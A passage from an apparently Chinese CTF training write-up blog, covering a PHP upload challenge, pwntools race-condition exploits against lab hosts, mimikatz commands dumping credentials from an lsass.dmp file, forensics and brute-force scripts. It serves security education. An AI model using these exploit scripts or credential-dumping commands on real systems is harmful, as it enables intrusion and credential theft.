<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>))) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]), <span class="hljs-string">&#x27;&lt;?&#x27;</span>) !== False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">100</span> || <span class="hljs-variable">$info</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">50</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>&#125;<br><br><span class="hljs-variable">$ready</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;ready&#x27;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ready</span> === <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>] = <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    &#125;<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">225</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> === (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;secretKey&#x27;</span>]) &#123;<br>        <span class="hljs-title function_ invoke__">upload</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="race"><a href="#race" class="headerlink" title="race"></a>race</h2><p>ida分析：<br>1：当i大于9，且输入不为1时，会调用<code>system(&quot;/bin/sh&quot;)</code>；<br>2：修改i的值需要调用thread1函数，在这里因为<code>count = 3</code> ，而每次执行<code>thread1</code>函数，都会使<code>count--</code>,<br>在正常的使用中，最多只能执行三次<code>i++</code>，不过因为<code>sleep(0xA)</code>的原因，线程会在验证<code>count</code>的值之后停下，我们可以在这10秒中，调用多次<code>thread1</code>函数，使多个线程卡在<code>++i</code>指令之前，在10秒之后，就会执行多次<code>++i</code>指令，使<code>i&gt;9</code>，这时输入一个非1的数字，程序就会调用<code>system(&quot;/bin/sh&quot;)</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-race-2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;172.19.1.28&#x27;</span>,<span class="hljs-string">&#x27;10001&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>time.sleep(<span class="hljs-number">0xb</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-race-1.png"></p><h2 id="race2"><a href="#race2" class="headerlink" title="race2"></a>race2</h2><p>在<code>file_read</code>函数中，当<code>buf</code>字符串中不存在<code>flag</code>时，会先等待<code>5</code>秒<br>然后打开<code>buf</code>字符串指定的文件，并输出文件内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2-2.png"></p><p>但因为程序是使用多线程调用的<code>file_read</code>函数，所以程序在等待<code>5</code>秒时，我们还是可以修改<code>buf</code>字符串的值</p><p>最后只需要先让线程执行到<code>sleep(5);</code>代码处，然后再输入<code>flag</code>，然后等待一段时间，程序就会打开靶机上的<code>flag</code>文件，并输出其内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2-3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>p=remote(<span class="hljs-string">&#x27;172.19.1.132&#x27;</span>,<span class="hljs-number">10002</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;abc&#x27;</span>)<br>time.sleep(<span class="hljs-number">1</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>time.sleep(<span class="hljs-number">5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc-3-hacker"><a href="#misc-3-hacker" class="headerlink" title="misc-3-hacker"></a>misc-3-hacker</h2><p>下载得到一个<code>lsass.dmp</code>文件，什么是<code>lsass.dmp</code>呢，它是<code>procdump</code>从<code>lsass.exe</code>中导出的凭据，可以用<code>mimikatz</code>读取</p><p>把文件放到程序目录下，以管理员运行<code>mimikatz</code>，执行以下命令</p><div class="note note-info">            <p>privilege::debug<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords full</p>          </div><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-misc-3-hacker-1.png"></p><p>如果报错<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;ProcessorArchitecture (0) != PROCESSOR_ARCHITECTURE_AMD64 (9)</code></p><p>那么可能是架构错了，用win32版本重新运行即可</p><h2 id="misc-3-funny-ASCII"><a href="#misc-3-funny-ASCII" class="headerlink" title="misc-3-funny ASCII"></a>misc-3-funny ASCII</h2><p>二进制数据转成文本即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-misc-3-funny%20ASCII-1.png"></p><h2 id="misc-4-password"><a href="#misc-4-password" class="headerlink" title="misc-4-password"></a>misc-4-password</h2><p>打开一看，发现有几个文件很小，只有4</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-MISC-4-password-1.png"></p><p>一般小于6的文件是可以进行crc爆破的，推荐<a href="https://github.com/theonlypwner/crc32">工具</a></p><p>用法：<code>python crc32.py reverse crc</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-MISC-4-password-2.png"></p><p>提取出来后转字符串得到<code>easypassword</code>，解压得到flag</p><h2 id="misc103"><a href="#misc103" class="headerlink" title="misc103"></a>misc103</h2><p>根据题目描述来看是一道数据恢复题</p><p>file命令看下文件<code>badimages: Linux rev 1.0 ext3 filesystem data, UUID=ca014691-c6ea-4a5a-8da4-74a1aa1c9a80</code></p><p>可以知道是linux下的ext3文件，linux下的文件恢复可以用<code>extundelete</code>命令</p><p>看日志：<code>extundelete &lt;file&gt; --journal</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-misc103-1.png"></p><p>尝试恢复所有目录和文件：<code>extundelete &lt;file&gt; --restore-all</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-misc103-2.png"></p><p>恢复到<code>RECOVERED_FILES</code>目录</p><p>flag在<code>RECOVERED_FILES/Flag.txt</code>中</p><h2 id="Misc-5-Forgotten-password"><a href="#Misc-5-Forgotten-password" class="headerlink" title="Misc-5-Forgotten password"></a>Misc-5-Forgotten password</h2><p>取证题</p><p>第一步肯定是获取内存镜像的基本信息</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-1.png"></p><p>根据hint<code>小明总是喜欢password记录下来</code>，用<code>editbox</code>显示出有关编辑控件的信息，得到密码<code>password*&amp;!@wxcq12</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-2.png"></p><p>用密码直接交不对，那么应该是压缩包之类的密码了<br>查找压缩包并导出</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-3.png"></p><p>用<code>editbox</code>得到的密码解压压缩包拿到flag</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Write-a-script"><a href="#Write-a-script" class="headerlink" title="Write a script"></a>Write a script</h2><p>md5爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br>word=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>r=itertools.product(word,repeat=<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br><br>    dec =<span class="hljs-string">&quot;flag&#123;P7%sY0OG%s0XPC%sZPK&#125;&quot;</span>%(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>],i[<span class="hljs-number">2</span>])<br>    dec=dec.strip()<br>    enc = hashlib.md5()<br>    enc.update(dec.encode())<br>    code=enc.hexdigest()<br>    code=code.strip()<br>    <span class="hljs-keyword">if</span> code[:<span class="hljs-number">4</span>]==<span class="hljs-string">&quot;9e86&quot;</span> <span class="hljs-keyword">and</span> code[-<span class="hljs-number">6</span>:]==<span class="hljs-string">&quot;0ea7cf&quot;</span>:<br>        <span class="hljs-built_in">print</span>(dec)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-Write%20a%20script-1.png"></p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>给了一个py文件和明文的md5值</p><p>代码中明文base64加密之后将小写字母全部变为大写</p><p>使用脚本暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    m1 = hashlib.md5(<span class="hljs-built_in">str</span>).hexdigest()<br>    <span class="hljs-keyword">if</span> m1 == <span class="hljs-string">&#x27;16478a151bdd41335dcd69b270f6b985&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>list1=itertools.product([<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;0&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    str1=<span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>    <span class="hljs-keyword">if</span> check(base64.b64decode(str1)):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;The Flag is &quot;</span>+base64.b64decode(str1)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;not &quot;</span>+str1<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="一张来自夏天的车票"><a href="#一张来自夏天的车票" class="headerlink" title="一张来自夏天的车票"></a>一张来自夏天的车票</h2><p>pyc文件，先进行反编译</p><p><code>uncompyle6 exp.pyc &gt; exp.py</code>失败，修复下文件</p><p>file看下版本，是3.6的</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-1.png"></p><p>构造一个3.6生成的pyc文件与<code>exp.pyc</code>对比</p><p>会发现中间少了四个字节</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-2.png"></p><p>填充上<code>00</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-3.png"></p><p>反编译后运行得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.8.0</span><br><span class="hljs-comment"># Python bytecode 3.6 (3379)</span><br><span class="hljs-comment"># Decompiled from: Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: exp.py</span><br><span class="hljs-comment"># Compiled at: 2021-06-10 15:30:34</span><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-string">&#x27;e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f&#x27;</span><br>enc = <span class="hljs-string">&#x27;XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf&#x27;</span><br><span class="hljs-built_in">print</span>(key[(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode2</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> base64.urlsafe_b64decode(m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode1</span>(<span class="hljs-params">m, key</span>):<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">6</span>):<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[i]) ^ <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(m[i])))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-built_in">print</span>(decode2(enc))<br>tmp = decode1(decode2(enc), key)<br><span class="hljs-built_in">print</span>(tmp)<br><span class="hljs-comment"># okay decompiling exp.pyc</span><br></code></pre></td></tr></table></figure><h2 id="啊？"><a href="#啊？" class="headerlink" title="啊？"></a>啊？</h2><p>安卓逆向题，先在模拟器上安装，找到验证函数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-%E5%95%8A%EF%BC%9F-1.png"></p><p>跳转到<code>check</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">M</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String str)</span> &#123;<br>        String key;<br>        <span class="hljs-keyword">if</span> (str.length() != <span class="hljs-number">16</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            key = m0getey();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            key = getKey();<br>            System.arraycopy(key, <span class="hljs-number">0</span>, str, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br>        &#125;<br>        <span class="hljs-type">int</span>[] iArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">16</span>];<br>        iArr[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>;<br>        iArr[<span class="hljs-number">12</span>] = <span class="hljs-number">14</span>;<br>        iArr[<span class="hljs-number">10</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">14</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">15</span>] = <span class="hljs-number">17</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">43</span>;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">5</span>;<br>            System.out.println();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">37</span>;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">85</span>;<br>        &#125;<br>        iArr[<span class="hljs-number">6</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">2</span>] = <span class="hljs-number">32</span>;<br>        iArr[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span>;<br>        iArr[<span class="hljs-number">11</span>] = <span class="hljs-number">68</span>;<br>        iArr[<span class="hljs-number">4</span>] = <span class="hljs-number">85</span>;<br>        iArr[<span class="hljs-number">13</span>] = <span class="hljs-number">5</span>;<br>        iArr[<span class="hljs-number">9</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">7</span>] = <span class="hljs-number">8</span>;<br>        iArr[<span class="hljs-number">8</span>] = <span class="hljs-number">22</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; str.length(); i++) &#123;<br>            <span class="hljs-keyword">if</span> ((iArr[i] &amp; <span class="hljs-number">255</span>) != ((str.charAt(i) ^ key.charAt(i % key.length())) &amp; <span class="hljs-number">255</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>本题的关键就是最后那个if判断，会将输入的字符串与key进行异或，值存储在<code>iArr</code>数组里</p><p>从上面贴出代码的第八行跳转到<code>m0getey</code>函数获取key</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-%E5%95%8A%EF%BC%9F-2.png"></p><p>解密脚本<br>将数组中的值和key逐个异或即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">v1 = [<span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">32</span>, <span class="hljs-number">23</span>, <span class="hljs-number">85</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">68</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>]<br>key = <span class="hljs-string">&quot;anylab&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((v1[x] &amp; <span class="hljs-number">255</span>) ^ (<span class="hljs-built_in">ord</span>(key[x % <span class="hljs-number">6</span>]) &amp; <span class="hljs-number">255</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次当ctf讲师^_^&lt;/p&gt;
&lt;p&gt;7.12-7.19 week1&lt;br&gt;7.19-7.26 week2&lt;br&gt;7.26-8.02 week3&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="奇安信" scheme="https://www.lewiserii.top/tags/%E5%A5%87%E5%AE%89%E4%BF%A1/"/>
    
    <category term="培训" scheme="https://www.lewiserii.top/tags/%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>2022强国杯技术技能大赛初赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp.html</id>
    <published>2022-07-17T09:00:00.000Z</published>
    <updated>2023-02-08T09:29:59.435Z</updated>
    
